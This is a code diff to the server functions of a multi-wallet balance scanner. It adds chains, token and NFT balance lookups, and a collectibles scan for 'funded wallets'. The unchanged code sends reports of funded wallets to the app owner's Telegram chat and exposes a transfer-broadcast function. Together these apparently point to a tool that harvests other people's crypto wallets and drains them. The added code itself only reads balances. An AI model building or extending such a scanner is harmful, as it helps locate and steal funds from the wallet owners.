@@ -1,6 +1,7 @@
 import { createServerFn } from "@tanstack/react-start";
 import { z } from "zod";
 import { sendReport } from "./telegram.server";
+import { readCollectibles } from "./collectibles.server";
 
 export const getServerInfo = createServerFn({ method: "GET" }).handler(async () => ({
   renderedAt: new Date().toISOString(),
@@ -13,6 +14,14 @@ const EVM_RPC = {
   avalanche: "https://avalanche-c-chain-rpc.publicnode.com",
   base: "https://base-rpc.publicnode.com",
   arbitrum: "https://arbitrum-one-rpc.publicnode.com",
+  optimism: "https://optimism-rpc.publicnode.com",
+  zksync: "https://mainnet.era.zksync.io",
+  linea: "https://rpc.linea.build",
+  scroll: "https://rpc.scroll.io",
+  gnosis: "https://gnosis-rpc.publicnode.com",
+  celo: "https://forno.celo.org",
+  mantle: "https://rpc.mantle.xyz",
+  blast: "https://blast.drpc.org",
 };
 
 const PRICE_IDS = {
@@ -28,6 +37,14 @@ const PRICE_IDS = {
   ripple: "ripple",
   base: "ethereum",
   arbitrum: "ethereum",
+  optimism: "ethereum",
+  zksync: "ethereum",
+  linea: "ethereum",
+  scroll: "ethereum",
+  blast: "ethereum",
+  gnosis: "xdai",
+  celo: "celo",
+  mantle: "mantle",
   ton: "the-open-network",
 };
 
@@ -123,6 +140,9 @@ const RATE_SYMBOLS = {
   ripple: "XRP",
   base: "ETH",
   arbitrum: "ETH",
+  optimism: "ETH",
+  celo: "CELO",
+  mantle: "MNT",
 };
 
 async function backupPrices() {
@@ -213,8 +233,8 @@ async function runPool(items, limit, worker) {
 
 async function jsonRpcBatch(url, addresses, method, readValue) {
   const out = {};
-  for (let start = 0; start < addresses.length; start += 200) {
-    const slice = addresses.slice(start, start + 200);
+  for (let start = 0; start < addresses.length; start += 100) {
+    const slice = addresses.slice(start, start + 100);
     const payload = slice.map((address, index) => ({
       jsonrpc: "2.0",
       id: index,
@@ -243,6 +263,166 @@ const solanaBalances = (addresses) =>
     row?.result?.value !== undefined ? Number(row.result.value) / 1e9 : NaN
   );
 
+// Well-known tokens per chain, read with batched balanceOf calls so a whole
+// address list costs a handful of requests per token set.
+const EVM_TOKENS = {
+  ethereum: [
+    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
+    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
+    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
+    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
+    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
+    { address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", symbol: "UNI", decimals: 18 },
+    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
+    { address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", symbol: "PEPE", decimals: 18 },
+  ],
+  bnb: [
+    { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
+    { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 },
+    { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", decimals: 18 },
+    { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", decimals: 18 },
+    { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTCB", decimals: 18 },
+  ],
+  polygon: [
+    { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT", decimals: 6 },
+    { address: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", symbol: "USDC", decimals: 6 },
+    { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC.e", decimals: 6 },
+    { address: "0x8f3Cf7ad23Cd3CaDbD9735AFF958023D60D76e60", symbol: "DAI", decimals: 18 },
+    { address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", symbol: "WETH", decimals: 18 },
+  ],
+  avalanche: [
+    { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT", decimals: 6 },
+    { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC", decimals: 6 },
+    { address: "0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB", symbol: "WETH.e", decimals: 18 },
+    { address: "0x50b7545627a5162F82A992c33b87aDc75187B218", symbol: "WBTC.e", decimals: 8 },
+  ],
+  base: [
+    { address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", symbol: "USDC", decimals: 6 },
+    { address: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", symbol: "USDbC", decimals: 6 },
+    { address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", symbol: "DAI", decimals: 18 },
+    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
+  ],
+  arbitrum: [
+    { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT", decimals: 6 },
+    { address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", symbol: "USDC", decimals: 6 },
+    { address: "0x912CE59144191C1204E64559FE8253a0e49E6548", symbol: "ARB", decimals: 18 },
+    { address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f", symbol: "WBTC", decimals: 8 },
+  ],
+  optimism: [
+    { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT", decimals: 6 },
+    { address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", symbol: "USDC", decimals: 6 },
+    { address: "0x4200000000000000000000000000000000000042", symbol: "OP", decimals: 18 },
+    { address: "0x4200000000000000000000000000000000000006", symbol: "WETH", decimals: 18 },
+  ],
+};
+
+const SPL_MINTS = {
+  EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v: "USDC",
+  Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB: "USDT",
+  DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263: "BONK",
+  JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN: "JUP",
+  EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm: "WIF",
+  "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R": "RAY",
+};
+
+const TRC20 = {
+  TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t: { symbol: "USDT", decimals: 6 },
+  TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8: { symbol: "USDC", decimals: 6 },
+};
+
+async function erc20Balances(rpc, tokens, addresses) {
+  const out = {};
+  if (!tokens || tokens.length === 0) return out;
+  const calls = [];
+  for (const address of addresses) for (const token of tokens) calls.push({ address, token });
+
+  for (let start = 0; start < calls.length; start += 100) {
+    const slice = calls.slice(start, start + 100);
+    const payload = slice.map((item, index) => ({
+      jsonrpc: "2.0",
+      id: index,
+      method: "eth_call",
+      params: [
+        {
+          to: item.token.address,
+          data: "0x70a08231" + item.address.replace(/^0x/, "").toLowerCase().padStart(64, "0"),
+        },
+        "latest",
+      ],
+    }));
+    try {
+      const rows = await postJson(rpc, payload);
+      for (const row of Array.isArray(rows) ? rows : [rows]) {
+        const index = Number(row && row.id);
+        const item = slice[index];
+        if (!item || typeof row?.result !== "string" || row.result.length < 3) continue;
+        const amount = Number(BigInt(row.result)) / 10 ** item.token.decimals;
+        if (!Number.isFinite(amount) || amount <= 0) continue;
+        if (!out[item.address]) out[item.address] = [];
+        out[item.address].push({ symbol: item.token.symbol, amount });
+      }
+    } catch {
+      // this batch was refused — those tokens simply show no balance
+    }
+  }
+  return out;
+}
+
+// Batched owner lookups: every SPL token, plus NFT-shaped rows. The public
+// endpoint throttles this call, so a refused batch is retried once.
+async function solanaTokenAccounts(addresses) {
+  const out = {};
+  const url = "https://api.mainnet-beta.solana.com";
+  const programId = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+  const readBatch = async (slice) => {
+    const payload = slice.map((address, index) => ({
+      jsonrpc: "2.0",
+      id: index,
+      method: "getTokenAccountsByOwner",
+      params: [address, { programId }, { encoding: "jsonParsed" }],
+    }));
+    for (let attempt = 0; attempt < 2; attempt += 1) {
+      try {
+        const rows = await postJson(url, payload);
+        if (Array.isArray(rows) || rows?.result) return Array.isArray(rows) ? rows : [rows];
+      } catch {
+        // throttled or refused — wait a moment and try once more
+      }
+      await new Promise((resolve) => setTimeout(resolve, 500));
+    }
+    return [];
+  };
+
+  for (let start = 0; start < addresses.length; start += 20) {
+    const slice = addresses.slice(start, start + 20);
+    const rows = await readBatch(slice);
+    for (const row of rows) {
+      const address = slice[Number(row && row.id)];
+      if (!address) continue;
+      const found = [];
+      let nfts = 0;
+      for (const item of (row?.result?.value || []).slice(0, 80)) {
+        const info = item?.account?.data?.parsed?.info;
+        const amount = Number(info?.tokenAmount?.uiAmount || 0);
+        if (!info || amount <= 0) continue;
+        const symbol = SPL_MINTS[info.mint];
+        if (symbol) {
+          found.push({ symbol, amount });
+        } else if (nfts < 3 && amount === 1 && Number(info.tokenAmount?.decimals) === 0) {
+          nfts += 1;
+          found.push({
+            kind: "nft",
+            name: `${info.mint.slice(0, 4)}…${info.mint.slice(-4)}`,
+            link: `https://solscan.io/token/${info.mint}`,
+          });
+        }
+      }
+      if (found.length) out[address] = found;
+    }
+  }
+  return out;
+}
+
 const TON_PUBKEY_CACHE = new Map();
 
 async function tonAddresses(pubkey) {
@@ -261,9 +441,13 @@ async function tonAddresses(pubkey) {
 // Bulk read for the multi-wallet scanner: many address/chain pairs in one call,
 // batched per chain so a whole list of wallets costs a handful of requests.
 export const scanWalletBalances = createServerFn({ method: "POST" })
-  .validator(z.object({ assets: z.array(ScanAssetSchema).max(1000) }))
+  .validator(
+    z.object({ assets: z.array(ScanAssetSchema).max(1000), tokens: z.boolean().optional() })
+  )
   .handler(async ({ data }) => {
+    const wantTokens = data.tokens !== false;
     const balances = {};
+    const tokens = {};
     const errors = {};
     const resolved = {};
     const groups = new Map();
@@ -285,20 +469,59 @@ export const scanWalletBalances = createServerFn({ method: "POST" })
       Array.from(groups.entries()).map(async ([chainId, list]) => {
         try {
           if (EVM_RPC[chainId]) {
-            const amounts = await evmBalances(EVM_RPC[chainId], list.map((asset) => asset.address));
+            const addresses = list.map((asset) => asset.address);
+            const [amounts, tokenAmounts] = await Promise.all([
+              evmBalances(EVM_RPC[chainId], addresses),
+              erc20Balances(EVM_RPC[chainId], wantTokens ? EVM_TOKENS[chainId] : [], addresses),
+            ]);
             for (const asset of list) {
               if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
               else errors[asset.key] = "unreadable";
+              if (tokenAmounts[asset.address]) tokens[asset.key] = tokenAmounts[asset.address];
             }
             return;
           }
 
           if (chainId === "solana") {
-            const amounts = await solanaBalances(list.map((asset) => asset.address));
+            const addresses = list.map((asset) => asset.address);
+            const [amounts, tokenAmounts] = await Promise.all([
+              solanaBalances(addresses),
+              wantTokens ? solanaTokenAccounts(addresses) : {},
+            ]);
             for (const asset of list) {
               if (Number.isFinite(amounts[asset.address])) balances[asset.key] = amounts[asset.address];
               else errors[asset.key] = "unreadable";
+              if (tokenAmounts[asset.address]) tokens[asset.key] = tokenAmounts[asset.address];
             }
+            return;
+          }
+
+          if (chainId === "tron") {
+            await runPool(list, 8, async (asset) => {
+              try {
+                const payload = await getJson(
+                  `https://api.trongrid.io/v1/accounts/${encodeURIComponent(asset.address)}`
+                );
+                const entry = (payload.data || [])[0];
+                if (!entry) {
+                  errors[asset.key] = "unreadable";
+                  return;
+                }
+                balances[asset.key] = Number(entry.balance || 0) / 1e6;
+                const found = [];
+                for (const row of entry.trc20 || []) {
+                  for (const [contract, raw] of Object.entries(row)) {
+                    const meta = TRC20[contract];
+                    if (!meta) continue;
+                    const amount = Number(raw) / 10 ** meta.decimals;
+                    if (Number.isFinite(amount) && amount > 0) found.push({ symbol: meta.symbol, amount });
+                  }
+                }
+                if (found.length) tokens[asset.key] = found;
+              } catch {
+                errors[asset.key] = "unreadable";
+              }
+            });
             return;
           }
 
@@ -344,7 +567,7 @@ export const scanWalletBalances = createServerFn({ method: "POST" })
       })
     );
 
-    return { balances, errors, resolved };
+    return { balances, errors, resolved, tokens };
   });
 
 // The report of funded wallets goes to the app owner's own Telegram chat.
@@ -464,3 +687,8 @@ export const broadcastTransfer = createServerFn({ method: "POST" })
 
     throw new Error("unsupported chain");
   });
+
+// NFTs, TON gifts and jettons for the funded wallets of a check.
+export const scanCollectibles = createServerFn({ method: "POST" })
+  .validator(z.object({ assets: z.array(ScanAssetSchema).max(400) }))
+  .handler(({ data }) => readCollectibles(data.assets));
